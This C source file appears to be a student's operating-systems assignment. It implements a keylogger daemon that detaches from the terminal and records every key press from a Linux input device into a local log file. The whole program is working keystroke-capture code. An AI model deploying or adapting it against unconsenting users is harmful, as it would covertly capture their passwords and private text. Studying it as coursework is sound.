/* Operating Systems - CS444
 * Spring 2023
 * Iselda Aiello
 * Assignment info:
 * Implement a daemon program that acts as a keylogger, reading keystrokes and writes them to a log file for parsing
 * Program Desc:
 * First, detaches the program from CML to run as a daemon. Then, creates a "keylogger.log" file for the keylogging.
 * This program utilizes the linux "dev/input/eventX" to get keystroke information, which is then parsed and written to the created keylogging file.
 * Last Modified: 4/4/23
 * Code Review Link https://drive.google.com/file/d/1wKhfu0vcA2PTVY9eQGolbg8vHNRidGey/view?usp=sharing
 */

/* includes */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <linux/input-event-codes.h>

/* struct */
struct input_event {
	struct timeval time;
	unsigned short type;
	unsigned short code;
	unsigned int value;
};

/* functions */
void write_to_log(struct input_event, FILE *);

/* main */
int main(){

  // fork off parent & terminate if successful to run in background
  __pid_t pid = fork();
  if (pid < 0){
    perror("Error when calling fork()\n");
    exit(1);
  } else if (pid > 0){
    exit(0);
  }

  // unmask for file editing
  umask(0);

  // create a new session
  if( setsid() < 0){
    perror("Error when calling setsid()\n");
    exit(1);
  }

  // fork again to get rid of session leader
  pid = fork();
  if (pid < 0){
    perror("Error when calling fork()\n");
    exit(1);
  } else if (pid > 0){
    exit(0);
  }

  // file for logging keystrokes
  FILE *log = fopen("keylogger.log", "w");

  // for storing input from event logger
  struct input_event input_data;
  // linux event logger
  FILE *event_logger = fopen("/dev/input/event3", "rb+");

  // begin keylogging
  while(1){

    // read in struct from event logger
    fread(&input_data, sizeof(input_data), 1, event_logger);

    // if a key is pressed down (i.e. not repeat/upstroke), write to log file
    if(input_data.type == EV_KEY && input_data.value == 1)
      write_to_log(input_data, log);

  }

  // close files
  fclose(log);
  fclose(event_logger);

  return 0;
}

void write_to_log(struct input_event data, FILE *logfile){
  char *input;

  // cases for what to print
  switch(data.code){
    case KEY_ESC:
      input = "{ESC}\n";
      break;
    case KEY_F1:
      input = "{F1}\n";
      break;
    case KEY_F2:
      input = "{F2}\n";
      break;
    case KEY_F3:
      input = "{F3}\n";
      break;
    case KEY_F4:
      input = "{F4}\n";
      break;
    case KEY_F5:
      input = "{F5}\n";
      break;
    case KEY_F6:
      input = "{F6}\n";
      break;
    case KEY_F7:
      input = "{F7}\n";
      break;
    case KEY_F8:
      input = "{F8}\n";
      break;
    case KEY_F9:
      input = "{F9}\n";
      break;
    case KEY_F10:
      input = "{F10}\n";
      break;
    case KEY_F11:
      input = "{F11}\n";
      break;
    case KEY_F12:
      input = "{F12}\n";
      break;
    case KEY_GRAVE:
      input = "`\n";
      break;
    case KEY_1: case KEY_KP1:
      input = "1\n";
      break;
    case KEY_2: case KEY_KP2:
      input = "2\n";
      break;
    case KEY_3: case KEY_KP3:
      input = "3\n";
      break;
    case KEY_4: case KEY_KP4:
      input = "4\n";
      break;
    case KEY_5: case KEY_KP5:
      input = "5\n";
      break;
    case KEY_6: case KEY_KP6:
      input = "6\n";
      break;
    case KEY_7: case KEY_KP7:
      input = "7\n";
      break;
    case KEY_8: case KEY_KP8:
      input = "8\n";
      break;
    case KEY_9: case KEY_KP9:
      input = "9\n";
      break;
    case KEY_0: case KEY_KP0:
      input = "0\n";
      break;
    case KEY_MINUS: case KEY_KPMINUS:
      input = "-\n";
      break;
    case KEY_EQUAL:
      input = "=\n";
      break;
    case KEY_BACKSPACE:
      input = "{BACKSPACE}\n";
      break;
    case KEY_TAB:
      input = "{TAB}\n";
      break;
    case KEY_Q:
      input = "q\n";
      break;
    case KEY_W:
      input = "w\n";
      break;
    case KEY_E:
      input = "e\n";
      break;
    case KEY_R:
      input = "r\n";
      break;
    case KEY_T:
      input = "t\n";
      break;
    case KEY_Y:
      input = "y\n";
      break;
    case KEY_U:
      input = "u\n";
      break;
    case KEY_I:
      input = "i\n";
      break;
    case KEY_O:
      input = "o\n";
      break;
    case KEY_P:
      input = "p\n";
      break;
    case KEY_LEFTBRACE:
      input = "[\n";
      break;
    case KEY_RIGHTBRACE:
      input = "]\n";
      break;
    case KEY_BACKSLASH:
      input = "\\\n";
      break;
    case KEY_CAPSLOCK:
      input = "{CAPS}\n";
      break;
    case KEY_A:
      input = "a\n";
      break;
    case KEY_S:
      input = "s\n";
      break;
    case KEY_D:
      input = "d\n";
      break;
    case KEY_F:
      input = "f\n";
      break;
    case KEY_G:
      input = "g\n";
      break;
    case KEY_H:
      input = "h\n";
      break;
    case KEY_J:
      input = "j\n";
      break;
    case KEY_K:
      input = "k\n";
      break;
    case KEY_L:
      input = "l\n";
      break;
    case KEY_SEMICOLON:
      input = ";\n";
      break;
    case KEY_APOSTROPHE:
      input = "'\n";
      break;
    case KEY_ENTER: case KEY_KPENTER:
      input = "{ENTER}\n";
      break;
    case KEY_LEFTSHIFT: case KEY_RIGHTSHIFT:
      input = "{SHIFT}\n";
      break;
    case KEY_Z:
      input = "z\n";
      break;
    case KEY_X:
      input = "x\n";
      break;
    case KEY_C:
      input = "c\n";
      break;
    case KEY_V:
      input = "v\n";
      break;
    case KEY_B:
      input = "b\n";
      break;
    case KEY_N:
      input = "n\n";
      break;
    case KEY_M:
      input = "m\n";
      break;
    case KEY_COMMA:
      input = ",\n";
      break;
    case KEY_DOT: case KEY_KPDOT:
      input = ".\n";
      break;
    case KEY_SLASH: case KEY_KPSLASH:
      input = "/\n";
      break;
    case KEY_LEFTCTRL: case KEY_RIGHTCTRL:
      input = "{CTRL}\n";
      break;
    case KEY_LEFTMETA: case KEY_RIGHTMETA:
      input = "{META}\n";
      break;
    case KEY_LEFTALT: case KEY_RIGHTALT:
      input = "{ALT}\n";
      break;
    case KEY_SPACE:
      input = "{SPACE}\n";
      break;
    case KEY_COMPOSE:
      input = "{COMPOSE}\n";
      break;
    case KEY_LEFT:
      input = "{LEFT}\n";
      break;
    case KEY_UP:
      input = "{UP}\n";
      break;
    case KEY_DOWN:
      input = "{DOWN}\n";
      break;
    case KEY_RIGHT:
      input = "{RIGHT}\n";
      break;
      break;
    case KEY_SYSRQ:
      input = "{SYSRQ}\n";
      break;
    case KEY_SCROLLLOCK:
      input = "{SCRLK}\n";
      break;
    case KEY_PAUSE:
      input = "{PAUSE}\n";
      break;
    case KEY_INSERT:
      input = "{INSERT}\n";
      break;
    case KEY_HOME:
      input = "{HOME}\n";
      break;
    case KEY_PAGEUP:
      input = "{PGUP}\n";
      break;
    case KEY_DELETE:
      input = "{DEL}\n";
      break;
    case KEY_END:
      input = "{END}\n";
      break;
    case KEY_PAGEDOWN:
      input = "{PGDN}\n";
      break;
    case KEY_NUMLOCK:
      input = "s\n";
      break;
    case KEY_KPASTERISK:
      input = "*\n";
      break;
    case KEY_KPPLUS:
      input = "+\n";
      break;
    // NULL for error checking
    default:
      input = NULL;
  }

  // write to file and force buffer to write
  if(input == NULL) fprintf(logfile, "ERR: cannot recognize event code %d\n", data.code);
  else fputs(input, logfile);
  fflush(logfile);

}